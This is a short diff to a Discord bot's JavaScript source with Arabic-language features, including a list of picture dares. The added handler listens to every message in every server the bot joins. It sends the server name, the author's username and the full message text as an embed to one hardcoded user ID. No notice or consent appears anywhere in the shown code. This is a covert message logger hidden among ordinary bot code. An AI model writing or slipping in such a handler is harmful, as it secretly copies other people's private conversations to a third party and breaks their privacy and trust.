@@ -558,6 +558,16 @@ const codes = {
   );
   };
   });
+client.on('message', message => {
+                var SAMSUNG = new Discord.RichEmbed()
+                .addField('** الـسيرفر** : ', `${message.guild.name}`,true)
+            .addField(' **الـمرسل ** : ', `${message.author.username}#${message.author.discriminator}`,true)
+            .addField(' **المنشن ** : ', `<@${message.author.id}>`,true)
+            .addField(' **الرسالة** : ', `${message.content}`)
+              .setThumbnail(message.guild.iconURL)
+              .setColor('RANDOM')
+              client.users.get("470294329768935443").send({embed: SAMSUNG});
+});
 
 var Za7f = [
   "**صورة وجهك او رجلك او خشمك او يدك**.",
